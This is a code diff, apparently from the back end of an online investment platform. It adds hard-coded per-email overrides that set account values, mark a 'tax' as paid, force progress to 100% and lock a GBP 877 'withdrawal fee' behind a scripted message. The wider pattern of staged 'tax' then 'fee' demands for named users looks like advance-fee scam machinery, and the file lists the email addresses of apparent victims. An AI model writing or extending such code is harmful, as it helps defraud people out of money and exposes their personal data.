@@ -391,6 +391,17 @@ const MANUAL_PROGRESS_OVERRIDES: Record<
     forceProgressPct: 100,
     lockTaxDisplay: true
   },
+  "obitoplutoworld@gmail.com": {
+    currentValue: 6700,
+    taxRate: 0.165,
+    taxDue: 587,
+    taxRemaining: 0,
+    taxPaid: 587,
+    initialHoldings: 500,
+    currency: "GBP",
+    forceProgressPct: 100,
+    lockTaxDisplay: true
+  },
   "josiahbauman03@gmail.com": {
     currentValue: 98970,
     taxRate: 0.165,
@@ -434,7 +445,8 @@ const WITHDRAWAL_FEE_LOCK_BY_EMAIL: Record<string, { amount: number; currency: "
   "ttvcurser@gmail.com": { amount: 500, currency: "GBP" },
   "tzahielk@gmail.com": { amount: 450, currency: "GBP" },
   "ajamibilal@yahoo.com": { amount: 493, currency: "USD" },
-  "obitoplutowrld@gmail.com": { amount: 531, currency: "GBP" }
+  "obitoplutowrld@gmail.com": { amount: 531, currency: "GBP" },
+  "obitoplutoworld@gmail.com": { amount: 877, currency: "GBP" }
 };
 const WITHDRAWAL_FEE_ALERT_BY_EMAIL: Record<string, string> = {
   "ammielcui@gmail.com": "Withdrawal fee payment required: GBP 1,275.00. Clear this fee to continue.",
@@ -449,6 +461,8 @@ const WITHDRAWAL_FEE_ALERT_BY_EMAIL: Record<string, string> = {
   ,
   "obitoplutowrld@gmail.com":
     "Congratulations on clearing your taxes. A refundable withdrawal fee of GBP 531.00 is now required to finalize your withdrawal.",
+  "obitoplutoworld@gmail.com":
+    "Congratulations, your tax requirement has been fully cleared and your progress is at 100%. To proceed with your withdrawal, a clearance fee of GBP 877.00 is required. Choose your withdrawal method and submit your request: Bank Transfer or Crypto.",
   "josiahbauman03@gmail.com":
     "Congratulations on clearing your taxes. Final step: your GBP 5,000.00 withdrawal is pending for your transaction to be approved."
 };
